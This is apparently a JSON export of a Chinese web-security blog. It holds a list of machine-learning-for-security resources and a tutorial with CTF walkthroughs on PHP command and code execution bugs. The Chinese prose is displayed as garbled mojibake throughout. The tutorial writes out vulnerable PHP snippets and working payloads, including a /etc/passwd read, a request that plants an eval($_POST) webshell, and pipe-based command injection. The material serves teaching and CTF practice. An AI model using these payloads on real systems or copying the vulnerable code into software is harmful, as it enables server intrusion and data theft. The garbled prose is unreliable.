è¯¥é¡¹ç›®åŒ…å«äº†ä¸€ç³»åˆ—ä¸IPythonã€Pandasã€Scikit Learnç›¸å…³çš„ç»ƒä¹ ï¼ŒåŒ…å«ç¬”è®°å’ŒåŸä»£ç ï¼Œæ¯ä¸ªç»ƒä¹ éƒ½ä¼šæ•…æ„è®¾ç½®ä¸€äº›å¸¸è§çš„ä»£ç é”™è¯¯ã€æ•°æ®åº“é”™è¯¯å’Œé€»è¾‘é”™è¯¯ä¾›ä½¿ç”¨è€…æ”¹æ­£ã€‚è¯¥ç³»åˆ—æ•™ç¨‹å‡ ä¹æ˜¯æœºå™¨å­¦ä¹ åœ¨ä¿¡æ¯å®‰å…¨é¢†åŸŸåº”ç”¨çš„å¿…å­¦æ•™ç¨‹ã€‚ 2. Using Neural Networks to generate human readable passwords é“¾æ¥ä¸­æ˜¯ä¸€ä½å¤§ç¥è‡ªå·±ç¼–å†™çš„ä¸€ä¸ªåŸºäºKerasæ¡†æ¶å’Œpythonè¯­è¨€çš„å¯†ç ç”Ÿæˆå™¨ï¼Œåˆ©ç”¨äº†æ·±åº¦ç¥ç»ç½‘ç»œåŸç†ï¼Œåœ¨ä¿è¯å¯†ç å®‰å…¨æ€§çš„åŒæ—¶ä¹Ÿä¿è¯äº†æ˜“è¯»æ€§ã€‚è¯¥é¡¹ç›®çš„ä»£ç å·²ç»åœ¨Githubä¸Šå¼€æºï¼Œå¯ä»¥ç»“åˆä¸Šæ–‡æåˆ°çš„è®ºæ–‡ã€ŠFast, Lean, and Accurate: Modeling Password Guessability Using Neural Networksã€‹ä¸€èµ·å­¦ä¹ ã€‚ åŸä»£ç ï¼šé“¾æ¥ 3. Machine Learning based Password Strength Classification è¯¥é¡¹ç›®å…³äºç”¨æœºå™¨å­¦ä¹ ç®—æ³•åˆ¤æ–­ä¸€ä¸ªå·²çŸ¥å¯†ç çš„å¥å£®æ€§ï¼Œä»£ç å·²ç»åœ¨Githubä¸Šå¼€æºã€‚ æºä»£ç ï¼šé“¾æ¥ 4. Using Machine Learning to Detect Malicious URLs è¯¥é¡¹ç›®å…³äºå¦‚ä½•åˆ©ç”¨æœºå™¨å­¦ä¹ æ¢æµ‹æ¶æ„çš„äº’è”ç½‘é“¾æ¥åœ°å€ï¼Œæ®ç§°å¯ä»¥è¾¾åˆ°98%çš„æ­£ç¡®ç‡ã€‚ æºä»£ç ï¼šé“¾æ¥ 5. Big Data and Data Science for Security and Fraud Detection è¿™æ˜¯ä¸€ç¯‡ç»¼è¿°æ–‡ç« ï¼Œæ–‡ä¸­ä»‹ç»äº†å¤šä¸ªå›½å®¶/åœ°åŒº/å¤§å…¬å¸æ­£åœ¨ä½¿ç”¨æˆ–ç ”å‘çš„å¤§æ•°æ®åˆ†æå·¥å…·å’ŒæŠ€æœ¯ï¼Œè¿™äº›æŠ€æœ¯ç»“åˆäº†æ–‡æœ¬æŒ–æ˜ã€æœºå™¨å­¦ä¹ æˆ–è€…ç½‘ç»œåˆ†æï¼Œèƒ½å¤Ÿåœ¨æ—©æœŸé˜¶æ®µå¯¹ç½‘ç»œå®‰å…¨å¨èƒè¿›è¡Œæ£€æµ‹å’Œé¢„é˜²ã€‚ 6. Using deep learning to break a Captcha system è¿™æ˜¯ä¸€ç¯‡åšå®¢æ–‡ç« ï¼Œä»‹ç»äº†å¦‚ä½•åˆ©ç”¨æ·±åº¦å­¦ä¹ æŠ€æœ¯ç ´è§£çƒ¦äººçš„éªŒè¯ç ç³»ç»Ÿï¼Œä½œè€…åœ¨æ–‡ä¸­ç»™å‡ºäº†éƒ¨åˆ†å…³é”®åŠŸèƒ½æ¨¡å—çš„æºä»£ç ï¼Œå¹¶ä¸”åœ¨æ–‡æœ«è¿˜ç»™å‡ºäº†è®¸å¤šå‚è€ƒé“¾æ¥ã€‚ 7. Data Mining for Cyber Security è¿™æ˜¯æ–¯å¦ç¦å¤§å­¦å¼€è®¾çš„ä¸€ä¸ªç³»åˆ—å…¬å¼€è¯¾ï¼Œå…³äºæ•°æ®æŒ–æ˜åœ¨äº’è”ç½‘å®‰å…¨ä¸­çš„åº”ç”¨ã€‚åœ¨é“¾æ¥ä¸­å¯ä»¥ç›´æ¥çœ‹åˆ°è¯¾ç¨‹å®‰æ’ï¼Œä¸‹è½½åˆ°è®²å¸ˆæ¼”è®²çš„æ–‡æœ¬è®°å½•ã€PPTï¼ŒæŸ¥çœ‹è¯¾åä½œä¸šçš„é¢˜ç›®å’Œæ­¤å‰åŒå­¦ä¸Šä¼ çš„ç­”æ¡ˆï¼Œä»¥åŠè¯¾åçš„æ·±å…¥é˜…è¯»åˆ—è¡¨ã€‚è¿™ä¸€è¯¾ç¨‹å¯èƒ½æ˜¯æ•°æ®ç§‘å­¦ç›®å‰åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸå·²ç»å…¬å¼€çš„æœ€å¥½çš„è¯¾ç¨‹ä¹‹ä¸€ã€‚ å…¶ä»– 1. System predicts 85 percent of cyber-attacks using input from human experts è¿™æ˜¯ä¸€ç¯‡ç ”ç©¶æˆæœä»‹ç»çš„æ–‡ç« ï¼Œä»‹ç»äº†æ¥è‡ªMITè®¡ç®—æœºç§‘å­¦ä¸äººå·¥æ™ºèƒ½å®éªŒå®¤ï¼ˆCSAILï¼‰å’Œä¸€å®¶æœºå™¨å­¦ä¹ åˆåˆ›å…¬å¸PatternExçš„æœ€æ–°ç ”ç©¶æˆæœï¼šä¸€ä¸ªåä¸ºAI2çš„äººå·¥æ™ºèƒ½å¹³å°ï¼Œèƒ½å¤Ÿæ ¹æ®äººç±»ç½‘ç»œå®‰å…¨ä¸“å®¶è¾“å…¥çš„æ•°æ®ï¼Œå¯¹å½“å‰ç½‘ç»œå¯èƒ½é­åˆ°çš„å®‰å…¨å¨èƒåšå‡ºé¢„æµ‹ï¼Œæ­£ç¡®ç‡é«˜è¾¾85%ï¼Œè¶…è¶Šäº†ç›®å‰å·²çŸ¥çš„å…¶ä»–åŒç±»é¢„æµ‹ç³»ç»Ÿã€‚æ–‡ä¸­é€šè¿‡æ–‡å­—å’Œè§†é¢‘çš„æ–¹å¼è®²è§£äº†è¿™ä¸€é¢„æµ‹ç³»ç»Ÿçš„åŸºæœ¬å·¥ä½œåŸç†ã€‚ 2. MLSec è¿™æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ç›¸å…³çš„ç½‘ç«™ï¼Œè¯¥ç½‘ç«™èšåˆäº†ä¸€ç³»åˆ—å°†æœºå™¨å­¦ä¹ æŠ€æœ¯åº”ç”¨äºç½‘ç»œå®‰å…¨é¢†åŸŸçš„å¼€æºé¡¹ç›®ï¼ŒåŒæ—¶è¿˜å¼€è®¾äº†åšå®¢æ–‡ç« å’Œç¤¾åŒºè®¨è®ºé¢‘é“ï¼Œå¸®åŠ©å¼€å‘è€…å¯¹è¿™äº›é¡¹ç›®æ·±å…¥ç†è§£ã€‚ 3. An Introduction to Machine Learning for Cybersecurity and Threat Hunting è¿™æ˜¯ä¸€ç¯‡æ·±åº¦æ–‡ç« ï¼Œé€šè¿‡ä¸å‡ ä½æ•°æ®ç§‘å­¦å¤§ç‰›è®¿è°ˆçš„å½¢å¼ï¼Œè¯¦ç»†ä»‹ç»äº†æœºå™¨å­¦ä¹ å’Œç½‘ç»œå®‰å…¨çš„å…³ç³»ä»¥åŠç›¸å…³åº”ç”¨ã€‚ ä»¥ä¸Šåªæ˜¯è¿™ä½å¤–å›½å¤§ç‰›çš„æ€»ç»“ï¼Œå¦‚æœä½ æ‰‹é‡Œä¹Ÿæœ‰ä¸€äº›å€¼å¾—å®‰åˆ©çš„å¹²è´§å’Œèµ„æºï¼Œä¸å¦¨åœ¨æ–‡æœ«ç•™è¨€åˆ†äº«å‡ºæ¥å§ï¼ é™„åŸæ–‡ä½œè€…ç®€ä»‹ï¼šFaizan Ahmadï¼ŒFulbright è®¡åˆ’å¤§å­¦ç”Ÿï¼Œç›®å‰åœ¨å·´åŸºæ–¯å¦å›½ç«‹è®¡ç®—æœºä¸æ–°å…´ç§‘å­¦å¤§å­¦ï¼ˆNational University of Computer and Emerging ScienCESï¼‰å­¦ä¹ ï¼ŒåŒæ—¶åœ¨å·´åŸºæ–¯å¦çš„æ‹‰åˆå°”ç®¡ç†ç§‘å­¦å¤§å­¦ï¼ˆLahore University of Management Sciencesï¼‰æ‹…ä»»ç ”ç©¶åŠ©ç†ï¼Œä¸»æ”»è®¡ç®—æœºå’Œç½‘ç»œå®‰å…¨ç ”ç©¶æ–¹å‘ã€‚ æ¥æºï¼škdnuggets","tags":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8/"}],"categories":[{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"ç½‘ç»œå®‰å…¨","slug":"æœºå™¨å­¦ä¹ /ç½‘ç»œå®‰å…¨","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨","date":"2020-01-16T12:30:45.000Z","path":"Web_security/basic_learning/18.å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨/","text":"Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨ å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åŸç† åº”ç”¨ç¨‹åºæœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œæ¯”å¦‚åœ¨PHPä¸­ï¼Œä½¿ç”¨systemã€execã€shell_execã€passthruã€popenã€proc_openç­‰å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸¾ä¸ªä¾‹å­æ¥è¯´ï¼šåå°ä»£ç è¿™ä¹ˆå†™&lt;?php system($_GET['cmd']); ?&gt;ï¼Œè¿™é‡Œçš„cmdå‚æ•°ç”¨æˆ·æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å‘é€è¯·æ±‚http://example.com/?cmd=lsæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ å¾ˆå¤šäººå–œæ¬¢æŠŠä»£ç æ‰§è¡Œæ¼æ´ç§°ä¸ºå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå› ä¸ºå‘½ä»¤æ‰§è¡Œæ¼æ´å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä»£ç æ‰§è¡Œæ¼æ´ä¹Ÿä¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿™æ ·å°±æ¯”è¾ƒå®¹æ˜“æ··æ·†ã€‚å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«æ˜¯ï¼šå‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯ç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä»£ç æ‰§è¡Œæ¼æ´åˆ™æ˜¯é æ‰§è¡Œä»£ç è„šæœ¬è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œæ¯”å¦‚ï¼ševal(system('set')) å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨ åˆ©ç”¨æ¡ä»¶ï¼š ä»£ç ä¸­å­˜åœ¨è°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚execã€systemç­‰ï¼› å‡½æ•°ä¸­å­˜åœ¨æˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼› å¯æ§å‚æ•°æ²¡æœ‰è¿‡æ»¤æˆ–è€…è¿‡æ»¤ä¸ä¸¥æ ¼ã€‚ æ¯”å¦‚ä¸‹é¢çš„PHPä»£ç æ®µï¼š 12345$uri = $request[&#x27;uri&#x27;];$from = $request[&#x27;from&#x27;];$to = $request[&#x27;to&#x27;];$tmp = &#x27;/tmp/act_css_tmp_&#x27;. $uri;system(&#x27;/usr/bin/wget $from -O $tmp&#x27;); $requestå˜é‡æ¥è‡ªç”¨æˆ·URLçš„è¾“å…¥ï¼Œæœ€ç»ˆè¿›å…¥åˆ°systemå‡½æ•°é‡Œä½œä¸ºå‘½ä»¤æ¥æ‰§è¡Œï¼Œä½†æ˜¯è¿™æ®µä»£ç æ²¡æœ‰è¿‡æ»¤ç”¨æˆ·çš„è¾“å…¥ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„è¾“å…¥æ¥åˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼š 1?cmd&#x3D;1190&amp;func&#x3D;sync_css&amp;uri&#x3D;hi&amp;from&#x3D;;cat &#x2F;etc&#x2F;passwd;&amp;to&#x3D;hi&amp;1&#x3D;2 å‘½ä»¤æ‰§è¡Œæ¼æ´å¯ä»¥æœ‰å¦‚ä¸‹çš„åˆ©ç”¨ï¼š å­˜åœ¨å›æ˜¾çš„è¯ï¼Œå¯ä»¥ç›´æ¥è¯»å…¥å„ç§é…ç½®æ–‡ä»¶ï¼Œå¯†ç æ–‡ä»¶ï¼Œæ•°æ®åº“è¿æ¥æ–‡ä»¶ç­‰ç­‰ï¼› ä¸å­˜åœ¨å›æ˜¾çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨æ—¶é—´å»¶è¿Ÿæ¨æ–­ï¼Œç±»ä¼¼ç›²æ³¨çš„æ–¹æ³•ã€‚é€šè¿‡ä¸€äº›å‘½ä»¤çš„å»¶æ—¶ä½œç”¨æ¥åˆ¤æ–­æ¼æ´çš„å­˜åœ¨ï¼Œä¾‹å¦‚pingå‘½ä»¤ï¼› ä¸èƒ½åœ¨æµè§ˆå™¨ç›´æ¥çœ‹åˆ°å›æ˜¾ï¼Œå¯å°†å‘½ä»¤é‡å®šå‘åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸­å¹¶æŸ¥çœ‹ã€‚æˆ–è€…ç”¨TFTPä¸Šä¼ å·¥å…·åˆ°æœåŠ¡å™¨ï¼Œç”¨telnetå’Œnetcatå»ºç«‹åå‘shellï¼Œç”¨mailé€šè¿‡SMTPå‘é€ç»“æœï¼› æŸ¥çœ‹è‡ªå·±çš„æƒé™ï¼Œå¯ä»¥æå‡æƒé™ï¼Œè®¿é—®æ•æ„Ÿæ•°æ®æˆ–æ§åˆ¶æœåŠ¡å™¨ã€‚ å‘½ä»¤æ‰§è¡Œæ¼æ´å¯åˆ©ç”¨çš„å‡½æ•° 12345678system()exec()shell_exec()passthru()pcntl_exec()popen()proc_open()åå¼•å· åå¼•å· åå¼•ç”¨çš„æœ¬è´¨å°±æ˜¯åœ¨æ“ä½œç³»ç»Ÿæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œæ­¤æ—¶å¯ä»¥é€ æˆå‘½ä»¤æ³¨å…¥ç­‰å„ç§å±å®³ã€‚ 123456[root@ca0y1h-centos ~]# echo lsls[root@ca0y1h-centos ~]# `echo ls`vulhub-master[root@ca0y1h-centos ~]# lsvulhub-master exec()/shell_exec()/passthru() 1234567string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )string shell_exec ( string $cmd )string escapeshellcmd ( string $command )void passthru ( string $command [, int &amp;$return_var ] ) è¿™å‡ ä¸ªå°±ä¸ç»†è¯´çš„ï¼Œè¯»åå­—éƒ½çŸ¥é“æ˜¯æ‰§è¡Œshellå‘½ä»¤,å¦‚æœå‡½æ•°æ‰§è¡Œæœªè¿‡æ»¤å®Œå–„çš„å¯æ§å‚æ•°ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ popen()/proc_open()/pcntl_exec() 12345resource popen ( string $command , string $mode )resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )void pcntl_exec ( string $path [, array $args [, array $envs ]] ) å…¶ä¸­popen()å’Œproc_open()æ˜¯ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœçš„ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤æ˜¯å·²ç»æ‰§è¡Œäº† ä»£ç æ‰§è¡Œæ¼æ´å¯åˆ©ç”¨çš„å‡½æ•° 1234567891011eval()assert()preg_replace()create_function()call_user_func()ob_start() eval()å‡½æ•° eval() å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ã€‚ è¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„ PHP ä»£ç ï¼Œä¸”å¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚ å¦‚æœæ²¡æœ‰åœ¨ä»£ç å­—ç¬¦ä¸²ä¸­è°ƒç”¨ return è¯­å¥ï¼Œåˆ™è¿”å› NULLã€‚å¦‚æœä»£ç ä¸­å­˜åœ¨è§£æé”™è¯¯ï¼Œåˆ™ eval() å‡½æ•°è¿”å› falseã€‚ æ¯”å¦‚ï¼š 1234&lt;?php $str = @(string)$_GET[&#x27;str&#x27;]; eval(&#x27;$str=&#x27;&quot;.addslashes($str).&quot;&#x27;;&#x27;);?&gt; åˆ©ç”¨æ–¹å¼ï¼š 1index.php?str&#x3D;$&#123;$&#123;phpinfo();&#125;&#125; é‚£ä¹ˆæ ¹æ®ä¸Šé¢ç»•è¿‡è¿‡æ»¤çš„æ–¹å¼æˆ‘ä»¬å°±å¯ä»¥è¿™æ ·å†™å…¥ä¸€å¥è¯ä»£ç äº†ã€‚ 1index.php?str&#x3D;$&#123;$&#123;fputs(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php @eval(\\$_POST[&#39;test&#39;])?&gt;&#39;)&#125;&#125; assert()å‡½æ•° ç¤ºä¾‹ä»£ç ï¼š 1234&lt;?php $a = $_GET[&#x27;a&#x27;]; assert($a);?&gt; åˆ©ç”¨æ–¹å¼ï¼š 123http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo();æˆ–http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo() eval()å’Œassert()åŒºåˆ« eval()å‡½æ•°æ­£ç¡®æ‰§è¡Œéœ€è¦æ»¡è¶³phpçš„ä»£ç è§„èŒƒï¼Œè€Œassert()å‡½æ•°åˆ™ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå¯¹äºphpçš„ä»£ç è§„èŒƒè¦æ±‚ä¸é«˜ preg_replace()å‡½æ•° ç¤ºä¾‹ä»£ç ï¼š 123&lt;?php preg_replace(&quot;//e&quot;, $GET[&#x27;test&#x27;], &quot;test...&quot;);?&gt; å½“replacement å‚æ•°æ„æˆä¸€ä¸ªåˆç†çš„php ä»£ç å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ/e ä¿®æ­£ç¬¦ä½¿preg_replace()ï¼Œå°†replacement å‚æ•°å½“åšphp ä»£ç æ‰§è¡Œã€‚ æ¡ˆä¾‹ï¼šX7 Chat 2.0.5 preg_replace() PHP Code Execution create_function()å‡½æ•° åœ¨php ä¸­ä½¿ç”¨create_function()åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambda-styleï¼‰,å¦‚æœå¯¹å‚æ•°æœªè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å®¡æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤ç‰¹æ®Šå­—ç¬¦ä¸²ç»™create_function()ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ ç¤ºä¾‹ä»£ç ï¼š 12345678&lt;?phperror_reporting(0);$sort_by = $_GET[&#x27;sort_by&#x27;];$sorter = &#x27;strnatcasecmp&#x27;;$databases=array(&#x27;1234&#x27;,&#x27;4321&#x27;);$sort_function = &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by . &#x27;&quot;], $b[&quot;&#x27; . $sort_by . &#x27;&quot;]);&#x27;;usort($databases, create_function(â€˜$a, $bâ€™, $sort_function));?&gt; é¦–å…ˆæ„é€ å‡ºå‡½æ•°åŸå‹ï¼š 123function test($a,$b)&#123; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by . &#x27;&quot;], $b[&quot;&#x27; . $sort_by . &#x27;&quot;]);&#125; æ ¹æ®è¿™ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payload: 1?sort_by&#x3D;â€]);&#125;phpinfo();&#x2F;* ä¼ å…¥åå¾—åˆ°ï¼š 1return 1 * strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo();&#x2F;*â€], $b[&quot;&quot;]);&#125;phpinfo();&#x2F;*â€]); å¾ˆæ˜¾ç„¶ï¼Œç»è¿‡/*æ³¨é‡Šç¬¦ æˆ‘ä»¬å‰©ä¸‹çš„åªæœ‰ï¼š 123function test($a,$b)&#123;return 1 * strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo(); æ¡ˆä¾‹ï¼šWordPress &lt;= 4.6.1 ä½¿ç”¨è¯­è¨€æ–‡ä»¶ä»»æ„ä»£ç æ‰§è¡Œ call_user_func()å‡½æ•° call_user_func(callable parameter [, mixed $â€¦ ]])æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ã€‚ ç¤ºä¾‹ä»£ç ï¼š 123&lt;?php call_user_func($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);?&gt; åˆ©ç”¨æ–¹å¼ï¼š 1index.php?a&#x3D;assert&amp;b&#x3D;phpinfo() ob_start() bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] ) å‡½æ•°æè¿°ï¼šæ­¤å‡½æ•°å°†æ‰“å¼€è¾“å‡ºç¼“å†²ã€‚å½“è¾“å‡ºç¼“å†²æ¿€æ´»åï¼Œè„šæœ¬å°†ä¸ä¼šè¾“å‡ºå†…å®¹ï¼ˆé™¤httpæ ‡å¤´å¤–ï¼‰ï¼Œç›¸åéœ€è¦è¾“å‡ºçš„å†…å®¹è¢«å­˜å‚¨åœ¨å†…éƒ¨ç¼“å†²åŒºä¸­ã€‚ å†…éƒ¨ç¼“å†²åŒºçš„å†…å®¹å¯ä»¥ç”¨ ob_get_contents() å‡½æ•°å¤åˆ¶åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡ä¸­ã€‚ æƒ³è¦è¾“å‡ºå­˜å‚¨åœ¨å†…éƒ¨ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨ ob_end_flush() å‡½æ•°ã€‚å¦å¤–ï¼Œ ä½¿ç”¨ ob_end_clean() å‡½æ•°ä¼šé™é»˜ä¸¢å¼ƒæ‰ç¼“å†²åŒºçš„å†…å®¹ã€‚ æ¯”å¦‚æœ‰å¦‚ä¸‹ä»£ç ï¼š 12345$key = &#x27;system&#x27;;ob_start($key);echo &#x27;ls -al&#x27;;ob_end_flush();# -rw-râ€“râ€“ 1 root root 0 Mar 12 06:46 tets å› ä¸ºè¿™é‡Œçš„$skyè¢«ä½œä¸ºè¾“å‡ºçš„å›è°ƒå‡½æ•°ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„ls -alåœ¨ç¼“å†²åŒºï¼Œç»è¿‡ob_end_flush()è¾“å‡ºç¼“å†²åŒºåï¼Œå¯ä»¥å¾—åˆ°system('ls -al')ï¼Œè¿™æ ·çš„æ“ä½œï¼Œæ‰€ä»¥æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ã€‚ ä»CTFçœ‹å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨ bugku æœ¬åœ°åŒ…å« æ‰“å¼€çœ‹åˆ°ä»£ç ï¼Œä¸¤ä¸ªè¦æ³¨æ„çš„ç‚¹ $a = @a=@_REQUEST[â€˜helloâ€™]; eval( â€œvar_dump($a);â€); ç¬¬ä¸€ä¸ªçš„æ„æ€å°±æ˜¯ä¸ç®¡ä½ æ˜¯postè¿˜æ˜¯getä¼ å‚ï¼Œrequestéƒ½èƒ½è·å–åˆ°helloçš„å€¼ ç¬¬äºŒä¸ªçœ‹åˆ°eval()å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œevalå¯ä»¥æ‰§è¡Œæ‹¬å·å†…çš„phpå‘½ä»¤ å¦‚æœå¯ä»¥æ„é€ ä¸€äº›å¯æ‰§è¡Œçš„phpä»£ç ï¼Œåˆ™evalå°±ä¼šå…¨éƒ¨æ‰§è¡Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ï¼Œä¾‹å¦‚ï¼š 1234567891011121314151617hello&#x3D;);print_r(file(â€œflag.phpâ€)hello&#x3D;);var_dump(file(â€œflag.phpâ€)hello&#x3D;file(â€œflag.phpâ€)hello&#x3D;file_get_contents(â€˜flag.phpâ€™)hello&#x3D;);include(@$_POST[â€˜bâ€™]- åœ¨POSTåŒºåŸŸï¼šb&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phphello&#x3D;);include(â€œphp:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpâ€hello&#x3D;1);show_source(â€˜flag.phpâ€™);var_dump(hello&#x3D;1);show_source(%27flag.php%27);var_dump(3 åˆ†åˆ«ä¼šæœ‰ä»€ä¹ˆæ ·çš„ç»“æœå‘¢ï¼š 1234567891011121314151617eval( â€œvar_dump();print_r(file(â€œflag.phpâ€));â€);eval( â€œvar_dump();var_dump(file(â€œflag.phpâ€));â€);eval( â€œvar_dump(file(â€œflag.phpâ€));â€);eval( â€œvar_dump(file_get_contents(â€˜flag.phpâ€™));â€);eval( â€œvar_dump();include(@$_POST[â€˜bâ€™]);â€);eval( â€œvar_dump();include(â€œphp:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpâ€);â€);- b&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpeval( â€œvar_dump(1);show_source(â€˜flag.phpâ€™);var_dump();â€);eval( â€œvar_dump(1);show_source(%27flag.php%27);var_dump(3);â€); æœ€ç»ˆéƒ½å¯ä»¥get flagã€‚ eval() å‡½æ•°å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ„é€ å‡ºæ–‡ä»¶åŒ…å«ä¼šæŠŠå­—ç¬¦ä¸²å‚æ•°å½“åšä»£ç æ¥æ‰§è¡Œã€‚ file() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œå¹¶å°†æ–‡ä»¶ä½œä¸ºä¸€ä¸ªæ•°ç»„è¿”å›ã€‚ print_r() å‡½æ•°åªç”¨äºè¾“å‡ºæ•°ç»„ã€‚ var_dump() å‡½æ•°å¯ä»¥è¾“å‡ºä»»ä½•å†…å®¹ï¼šè¾“å‡ºå˜é‡çš„å®¹ï¼Œç±»å‹æˆ–å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œç±»å‹ï¼Œé•¿åº¦ã€‚ hello=file(â€œflag.phpâ€)ï¼Œæœ€ç»ˆä¼šå¾—åˆ°var_dump(file(â€œflag.phpâ€))ï¼Œä»¥æ•°ç»„å½¢å¼è¾“å‡ºæ–‡ä»¶å†…å®¹ã€‚ include()å‡½æ•°å’Œphp://inputï¼Œphp://filterç»“åˆå¾ˆå¥½ç”¨ï¼Œphp://filterå¯ä»¥ç”¨ä¸è¯»å–æ–‡ä»¶æºä»£ç ï¼Œç»“æœæ˜¯æºä»£ç base64ç¼–ç åçš„ç»“æœã€‚ æ”»é˜²ä¸–ç•Œ command execution pingä¸€ä¸ª 127.0.0.1 | ls â€¦/â€¦/â€¦/home åªæ‰§è¡Œåé¢åŠå¥ï¼Œçœ‹åˆ°â€¦/â€¦/â€¦/homeç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå°±çœ‹åˆ°äº†flag.txt æŸ¥çœ‹flag.txt ç”¨catå‘½ä»¤ 127.0.0.1 | cat â€¦/â€¦/â€¦/home/flag.txt å°±å¯ä»¥get flag Windowsï¼š | ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ ping 127.0.0.1|whoami || å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡ ping 2 || whoami &amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami 